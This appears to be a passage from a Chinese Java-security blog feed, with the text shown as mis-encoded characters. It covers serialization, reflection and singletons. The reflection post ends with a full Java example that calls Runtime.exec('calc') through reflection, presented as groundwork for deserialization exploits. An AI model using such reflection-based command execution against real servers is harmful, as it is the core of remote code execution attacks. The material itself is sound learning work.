id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å®ç°"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å®ç°" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å®ç°"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å®ç°</h2><p>åºåˆ—åŒ–å¯¹è±¡ä¼šé€šè¿‡<code>ObjectOutputStream</code>çš„<code>writeObject</code>æ–¹æ³•å°†ä¸€ä¸ªå¯¹è±¡å†™å…¥åˆ°æ–‡ä»¶ä¸­ã€‚</p><p>è€Œååºåˆ—åŒ–æ˜¯ä½¿ç”¨äº†<code>ObjectInputStreamç±»</code>çš„<code>readObject</code> æ–¹æ³•è¿›è¡Œè¯»å–å¹¶è¿˜åŸæˆåœ¨åºåˆ—åŒ–å‰çš„ä¸€ä¸ªç±»ã€‚</p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>å®šä¹‰äº†ä¸€ä¸ªPersonç±»ï¼Œå®ç°äº†<strong>Serializable</strong>æ¥å£ï¼Œæœ‰ä¸¤ä¸ªå±æ€§å’Œä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œé‡å†™äº†<code>toString()</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135149134.png" alt="image-20240521135149134"></p><p>å¯ä»¥çœ‹åˆ°<strong>Serializable</strong>æ˜¯ç©ºæ¥å£ï¼Œå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªæ ‡è®°ï¼Œå®ç°äº†å®ƒæ‰èƒ½åºåˆ—åŒ–ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135203323.png" alt="image-20240521135203323"></p><p>å®šä¹‰äº†ä¸€ä¸ªserializeé™æ€æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135344209.png" alt="image-20240521135344209"></p><p>åºåˆ—åŒ–çš„ç»“æœ</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135254681.png" alt="image-20240521135254681"></p><p>ååºåˆ—åŒ–ï¼šè¿˜åŸæˆåœ¨åºåˆ—åŒ–å‰çš„ä¸€ä¸ªç±»ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135403252.png" alt="image-20240521135403252"></p><h2 id="ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜"><a href="#ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜"></a>ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜</h2><p>åºåˆ—åŒ–çš„æ•°æ®ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨æœ‰ååºåˆ—åŒ–çš„æ“ä½œï¼Œé‚£å…¶ä¸­çš„ä»£ç ä¸€å®šä¼šæ‰§è¡Œï¼Œç»™äºˆäº†æ”»å‡»è€…åœ¨æœåŠ¡å™¨æ‰§è¡Œä»£ç çš„èƒ½åŠ›ã€‚</p><p>(ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–æ•°æ®ï¼ŒæœåŠ¡å™¨ååºåˆ—åŒ–æ“ä½œä¸€å®šä¼šæ‰§è¡Œ<code>readObject()</code>æ–¹æ³•)</p><h2 id="å¯»æ‰¾å…¥å£ç±»"><a href="#å¯»æ‰¾å…¥å£ç±»" class="headerlink" title="å¯»æ‰¾å…¥å£ç±»"></a>å¯»æ‰¾å…¥å£ç±»</h2><p>æ€ä¹ˆç®—æ˜¯ä¸€ä¸ªå¥½çš„å…¥å£ç±»ï¼Ÿå®ç°äº†<code>Serializable</code>æ¥å£,é‡å†™äº†readObjectï¼Œå‚æ•°ç±»å‹å®½æ³›ï¼Œæœ€å¥½JDKè‡ªå¸¦ã€‚</p><p>è¿™æ ·æˆ‘ä»¬å¾ˆå®¹æ˜“å°±ä¼šæƒ³åˆ°Mapï¼ŒHashMapå®ç°äº†<strong>Serializable</strong>æ¥å£ï¼Œé‡å†™äº†<code>readObject()</code>æ–¹æ³•ã€‚ï¼ˆåœ¨ç±»é‡Œé¢é‡å†™äº†<code>readObject()</code>æ–¹æ³•ï¼ŒJDKä¼šè‡ªåŠ¨è°ƒç”¨é‡å†™çš„<code>readObject()</code>æ–¹æ³•ï¼Œè€Œä¸è°ƒç”¨åŸç”Ÿçš„<code>readObject()</code>ï¼‰<img src="https://image.sp4rks.xyz/2024/06/image-20240521141902419.png" alt="image-20240521141902419"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240521142108326.png" alt="image-20240521142108326"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åå°„</title>
    <link href="/2024/05/16/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%B0%84/"/>
    <url>/2024/05/16/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å­¦ä¹ Javaçš„åå°„æœºåˆ¶æ˜¯ä¸ºäº†ç†è§£Apache Commons Collectionsä¸­çš„ååºåˆ—åŒ–æ¼æ´åšå‡†å¤‡çš„ã€‚</p><h2 id="åå°„æ¦‚å¿µ"><a href="#åå°„æ¦‚å¿µ" class="headerlink" title="åå°„æ¦‚å¿µ"></a>åå°„æ¦‚å¿µ</h2><p>åå°„æ˜¯ä¸€ç§é—´æ¥æ“ä½œç›®æ ‡å¯¹è±¡çš„æœºåˆ¶ï¼Œå…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶è·å–ç±»çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°åˆ›å»ºå¯¹è±¡ã€è°ƒç”¨æ–¹æ³•ã€è®¿é—®å­—æ®µç­‰ç­‰ï¼›<strong>å¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„æ–¹æ³•&#x2F;è®¿é—®å±æ€§ã€‚</strong></p><hr><p>å®è´¨å°±æ˜¯å¾—åˆ°ä¸€ä¸ªClasså¯¹è±¡åï¼Œåå‘è·å–Classå¯¹è±¡çš„å¯¹è±¡ã€‚</p><h2 id="Classç±»ã€Classå¯¹è±¡ä¸classå…³é”®å­—"><a href="#Classç±»ã€Classå¯¹è±¡ä¸classå…³é”®å­—" class="headerlink" title="Classç±»ã€Classå¯¹è±¡ä¸classå…³é”®å­—"></a>Classç±»ã€Classå¯¹è±¡ä¸classå…³é”®å­—</h2><p><code>Classç±»</code>æ˜¯javaä¸­çš„ä¸€ä¸ªç±»ï¼Œä½äº<strong>java.lang</strong>åŒ…ä¸­ã€‚å®ƒæä¾›äº†ç”¨äºè·å–ç±»ä¿¡æ¯å’Œæ“ä½œç±»æˆ–å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•çš„æ–¹æ³•ã€‚<img src="https://image.sp4rks.xyz/2024/06/image-20240514205516919.png" alt="image-20240514205516919"></p><p><code>Classå¯¹è±¡</code>æ˜¯JVMåœ¨è¿è¡Œæ—¶ä¿ç•™çš„æ¯ä¸ªç±»çš„æè¿°ä¿¡æ¯ã€‚Classå¯¹è±¡åŒ…å«äº†è¯¥ç±»çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»çš„åç§°ã€å±æ€§ã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ã€‚Classå¯¹è±¡å¯ä»¥é€šè¿‡Classç±»çš„å„ç§æ–¹æ³•è·å–ã€‚</p><p><code>class</code>æ˜¯javaçš„å…³é”®å­—ï¼Œç”¨äºå£°æ˜ç±»ã€‚</p><hr><p><strong>å¯¹Classç±»è§£è¯»:</strong></p><p>æˆ‘ä»¬é€šå¸¸è®¤ä¸ºç±»æ˜¯å¯¹è±¡çš„æŠ½è±¡å’Œé›†åˆï¼ŒClasså°±ç›¸å½“äºæ˜¯å¯¹ç±»çš„æŠ½è±¡å’Œé›†åˆã€‚<br>ä¹Ÿå¯ä»¥è®¤ä¸ºå¯¹è±¡æ˜¯ç±»çš„å®ä¾‹ï¼Œç±»æ˜¯Classçš„å®ä¾‹ã€‚</p><h2 id="è·å–Classå¯¹è±¡"><a href="#è·å–Classå¯¹è±¡" class="headerlink" title="è·å–Classå¯¹è±¡"></a>è·å–Classå¯¹è±¡</h2><p>é€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•è·å–ä¸€ä¸ªç±»çš„Classå¯¹è±¡</p><h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;Test&quot;</span>);     å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿â½¤ forName æ¥è·å–<br></code></pre></td></tr></table></figure><h3 id="Test-class"><a href="#Test-class" class="headerlink" title="Test.class"></a>Test.class</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; bClass = Test.class;    å¦‚æœå·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„ java.lang.Class å¯¹è±¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥æ‹¿å®ƒçš„classå±æ€§ã€‚<br></code></pre></td></tr></table></figure><h3 id="obj-getClass"><a href="#obj-getClass" class="headerlink" title="obj.getClass()"></a>obj.getClass()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Test cClass= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Test</span>&gt; aClass1 = cClass.getClass();  å¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ obj ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ obj.getClass() æ¥è·å–å®ƒçš„ç±»<br></code></pre></td></tr></table></figure><p><img src="https://image.sp4rks.xyz/2024/06/image-20240514215718317.png" alt="image-20240514215718317"></p><p>ä½†åœ¨è¿™ä¸‰ç§è·å–CLassç±»æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸‰ç§é€šè¿‡Class.forNameæ–¹æ³•å»åŠ¨æ€åŠ è½½ç±»ã€‚ä¸”ä½¿ç”¨forNameå°±ä¸éœ€è¦importå¯¼å…¥å…¶ä»–ç±»ï¼Œå¯ä»¥åŠ è½½æˆ‘ä»¬ä»»æ„çš„ç±»ã€‚</p><h2 id="å®ä¾‹åŒ–å¯¹è±¡"><a href="#å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="å®ä¾‹åŒ–å¯¹è±¡"></a>å®ä¾‹åŒ–å¯¹è±¡</h2><p>è·å–åˆ°Classä¹‹åï¼Œå®ä¾‹åŒ–å¯¹è±¡ï¼Œ<code>newInstance()</code>æ–¹æ³•è°ƒç”¨æ— å‚çš„æ„é€ å™¨åˆ›å»ºå¯¹è±¡ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516090748055.png" alt="image-20240516090748055"></p><p>(<strong>Class</strong>ç±»ä¸­çš„<code>newInstance()</code>æ–¹æ³•)</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102707921.png" alt="image-20240516102707921"></p><p><code>java.lang.relect.Constructor</code>ç±»é‡Œä¹Ÿæœ‰ä¸€ä¸ª<code>newInstance()</code>æ–¹æ³•å¯ä»¥åˆ›å»ºå¯¹è±¡ï¼Œè¯¥æ–¹æ³•å’ŒClassç±»ä¸­çš„<code>newInstance()</code>æ–¹æ³•å¾ˆåƒï¼Œä½†æ˜¯ç›¸æ¯”ä¹‹ä¸‹ï¼ŒConstructorç±»çš„<code>newInstance()</code>æ–¹æ³•æ›´åŠ å¼ºå¤§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ª<code>newInstance()</code>æ–¹æ³•è°ƒç”¨æœ‰å‚æ•°çš„å’Œç§æœ‰çš„æ„é€ æ–¹æ³•ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102944537.png" alt="image-20240516102944537"></p><p>è¿™æ—¶æœ‰ä¸ªé—®é¢˜ï¼Œæ¯”å¦‚ä¸€ä¸ªç±»æœ‰å¾ˆå¤šçš„æ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬æ€ä¹ˆèƒ½æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ„é€ æ–¹æ³•å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>getConstructor()</code>,å®ƒæ ¹æ®æä¾›çš„å‚æ•°ç±»å‹æ¥å®šä½ç‰¹å®šçš„æ„é€ å‡½æ•°ã€‚å¯ä»¥ä»<code>getConstructor()</code>çš„å‡½æ•°å£°æ˜ä¸­çœ‹åˆ°ï¼Œå‚æ•°ç±»å‹æ˜¯Classå¯å˜é•¿å‚æ•°ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516094652144.png" alt="image-20240516094652144"></p><p>å› ä¸ºTestç±»ä¸­æœ‰ä¸¤ä¸ªå±æ€§ï¼Œ<strong>Sting name</strong>å’Œ<strong>int age</strong>ï¼Œ<code>getConstructor()</code>å¡«å…¥<strong>String.class</strong>å’Œ<strong>int.class</strong>,å‘ç°æŠ¥é”™äº†ï¼ŒæŠ¥é”™ä¿¡æ¯æç¤ºæ²¡æœ‰è¿™ä¸ªæ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516091359629.png" alt="image-20240516091359629"></p><p>å¯ä»¥çœ‹åˆ°Testç±»ä¸­<strong>age</strong>å±æ€§æ˜¯ç§æœ‰çš„ï¼Œè¿™æ—¶ä½¿ç”¨<code>getDeclaredConstructor()</code>æ–¹æ³•ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516090723742.png" alt="image-20240516090723742"></p><p>è®¾ç½®è®¿é—®æƒé™ä¸ºtrueã€‚å°±å¯ä»¥é€šè¿‡æœ‰å‚æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516091419131.png" alt="image-20240516091419131"></p><h2 id="è·å–ç±»çš„å±æ€§"><a href="#è·å–ç±»çš„å±æ€§" class="headerlink" title="è·å–ç±»çš„å±æ€§"></a>è·å–ç±»çš„å±æ€§</h2><p>é€šè¿‡<code>getFields()</code>å¯ä»¥è·å–å±æ€§ï¼Œä½†æ˜¯å‘ç°è¿™é‡Œåªè·å–äº†nameï¼Œageå¹¶æ²¡æœ‰è¢«è·å–ï¼ŒåŸå› å…¶å®å’Œä¸Šé¢ç±»ä¼¼ï¼Œå¿…é¡»ç”¨<code>getDeclaredFields()</code>å¹¶è®¾ç½®è®¿é—®æƒé™ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516095310090.png" alt="image-20240516095310090"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516095330837.png" alt="image-20240516095330837"> </p><p><code>set()</code>æ–¹æ³•é€šå¸¸å’Œ<code>getField()</code>æ­é…ä½¿ç”¨,<code>set()</code>æ–¹æ³•æ˜¯<code>Field</code>ç±»çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºé€šè¿‡åå°„æœºåˆ¶è®¾ç½®å¯¹è±¡çš„å­—æ®µå€¼ï¼Œå…·ä½“ä¸€ç‚¹å°±æ˜¯<code>Field</code>å¯¹è±¡è¡¨ç¤ºç±»ä¸­çš„ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œ<code>set()</code>æ–¹æ³•å…è®¸ä¿®æ”¹è¿™ä¸ªå­—æ®µçš„å€¼ï¼Œå³ä½¿è¯¥å­—æ®µæ˜¯ç§æœ‰çš„ã€‚åœ¨ä½¿ç”¨ä¹‹å‰ï¼Œé€šå¸¸éœ€è¦è°ƒç”¨<code>setAccessible(true)</code>æ¥ç»•è¿‡Javaçš„è®¿é—®æ§åˆ¶æ£€æŸ¥ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516101853830.png" alt="image-20240516101853830"></p><p><strong>age</strong>å±æ€§æ˜¯ç§æœ‰çš„</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102050549.png" alt="image-20240516102050549"></p><p>ï¼ˆé€šè¿‡<code>getDeclaredField()</code>è®¾ç½®è®¿é—®æƒé™ï¼‰</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102124715.png" alt="image-20240516102124715"></p><h2 id="è°ƒç”¨ç±»çš„æ–¹æ³•"><a href="#è°ƒç”¨ç±»çš„æ–¹æ³•" class="headerlink" title="è°ƒç”¨ç±»çš„æ–¹æ³•"></a>è°ƒç”¨ç±»çš„æ–¹æ³•</h2><p>Testç±»æœ‰public Helloæ–¹æ³•å’ŒPrivate prHelloæ–¹æ³•ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516113808489.png" alt="image-20240516113808489"></p><p>é€šè¿‡<code>getMethods()</code>å¯ä»¥è·å–å…¬å…±æ–¹æ³•ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516112756232.png" alt="image-20240516112756232"></p><p>é€šè¿‡<code>getDeclaredMethods()</code>å¯ä»¥è·å–å…¬å…±æ–¹æ³•å’Œç§æœ‰æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516112826908.png" alt="image-20240516112826908"></p><p><code>getMethod()</code>é€šå¸¸å’Œ<code>invoke()</code>æ­é…ï¼Œ<code>invoke()</code>å¯ä»¥åŠ¨æ€åœ°åœ¨è¿è¡Œæ—¶è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ã€‚å…¶å®ä¹Ÿä¸éš¾ç†è§£ï¼Œæˆ‘ä»¬é€šè¿‡<code>getMethod()</code>åå°„è·å¾—ä¸€ä¸ªæ–¹æ³•åï¼Œè‚¯å®šéœ€è¦æŒ‡å®šæ˜¯å“ªä¸ªç±»ï¼Œå¹¶ä¸”æŒ‡æ˜æ‰§è¡Œçš„å‚æ•°ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516131226025.png" alt="image-20240516131226025"></p><p>ç”¨<code>getMethod()</code>è°ƒç”¨ä¸€ä¸‹Testç±»ä¸­çš„<code>Hello()</code>æ–¹æ³•ï¼Œå¯ä»¥å‘ç°å®ƒè°ƒç”¨çš„æ˜¯æ— å‚çš„æ–¹æ³•ï¼Œå’Œå®ä¾‹åŒ–å¯¹è±¡çš„æƒ…å†µç±»ä¼¼ï¼ŒæŠ¥é”™äº†ï¼Œéœ€è¦æŒ‡æ˜å®ƒçš„ç±»å‹ï¼Œå¦åˆ™è°ƒç”¨æ— å‚çš„æ–¹æ³•ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516130413038.png" alt="image-20240516130413038"></p><p>(Classç±»ä¸­çš„<code>getMethod()</code>æ–¹æ³•)</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516113750554.png" alt="image-20240516113750554"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516130817172.png" alt="image-20240516130817172"></p><h2 id="å°ç»ƒä¹ ï¼Œåå°„å¼¹è®¡ç®—å™¨"><a href="#å°ç»ƒä¹ ï¼Œåå°„å¼¹è®¡ç®—å™¨" class="headerlink" title="å°ç»ƒä¹ ï¼Œåå°„å¼¹è®¡ç®—å™¨"></a>å°ç»ƒä¹ ï¼Œåå°„å¼¹è®¡ç®—å™¨</h2><p>æ­£å¸¸æƒ…å†µä¸‹å’±ä»¬å¼¹è®¡ç®—å™¨<img src="https://image.sp4rks.xyz/2024/06/image-20240516133359336.png" alt="image-20240516133359336"></p><p>åå°„å†™æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516141618708.png" alt="image-20240516141618708"></p><p>å› ä¸º <code>getRuntime()</code>æ˜¯é™æ€æ–¹æ³•ï¼Œå±äºç±»ï¼Œæ‰€ä»¥<code>getRuntime.invoke()</code>;ä¸éœ€è¦æŒ‡å®šå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è°ƒç”¨ getRuntime æ–¹æ³•ï¼Œè·å¾— Runtime ç±»çš„å®ä¾‹</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><img src="https://image.sp4rks.xyz/2024/06/image-20240516143222774.png" alt="image-20240516143222774"></p><p>å®Œæ•´ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><br>        <span class="hljs-comment">//è·å–Runtime ç±»çš„ Class å¯¹è±¡</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-comment">//è·å– Runtime ç±»ä¸­åä¸º getRuntime çš„æ–¹æ³•çš„å¼•ç”¨</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-comment">//è°ƒç”¨ getRuntime æ–¹æ³•ï¼Œè·å¾— Runtime ç±»çš„å®ä¾‹</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//getMethod() æ–¹æ³•è·å– exec æ–¹æ³•çš„å¼•ç”¨</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-comment">//ç”¨ invoke() æ–¹æ³•è°ƒç”¨ exec</span><br>        exec.invoke(runtimeInstance, <span class="hljs-string">&quot;calc&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.csdn.net/MrYushiwen/article/details/107380536">JAVAåå°„</a></p><p><a href="https://www.javasec.org/javase/Reflection/Reflection.html">javaåå°„æœºåˆ¶</a></p><p><a href="https://xz.aliyun.com/t/7029?time__1311=n4+xnD0GDti=zuDBqooGkY=G=L1K7K6dx&alichlgref=https://xz.aliyun.com/t/7029#toc-0">JAVAååºåˆ—åŒ– - åå°„æœºåˆ¶</a></p><p><a href="https://xz.aliyun.com/t/9117?time__1311=n4+xuDgD9DyDnDfhx0O4BqDwp0YicWe4FPmD&alichlgref=https://www.google.com/">JAVAå®‰å…¨åŸºç¡€ï¼ˆäºŒï¼‰â€“ åå°„æœºåˆ¶</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ›å»ºå‹-å•ä¾‹æ¨¡å¼</title>
    <link href="/2024/05/10/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    <url>/2024/05/10/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="é¥¿æ±‰å¼"><a href="#é¥¿æ±‰å¼" class="headerlink" title="é¥¿æ±‰å¼"></a>é¥¿æ±‰å¼</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//ç”¨äºå¼•ç”¨å…¨å±€å”¯ä¸€çš„å•ä¾‹å¯¹è±¡ï¼Œåœ¨ä¸€å¼€å§‹å°±åˆ›å»ºå¥½</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//ä¸å…è®¸éšä¾¿new</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;   <span class="hljs-comment">//è·å–å…¨å±€å”¯ä¸€çš„å•ä¾‹å¯¹è±¡</span><br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Singleton.getInstance();<br>        System.out.println(instance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ‡’æ±‰å¼"><a href="#æ‡’æ±‰å¼" class="headerlink" title="æ‡’æ±‰å¼"></a>æ‡’æ±‰å¼</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">//åœ¨ä¸€å¼€å§‹ä¸åˆ›å»ºå¯¹è±¡</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">//å¦‚æœå®ä¾‹ä¸ºç©ºå°±åˆ›å»º</span><br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    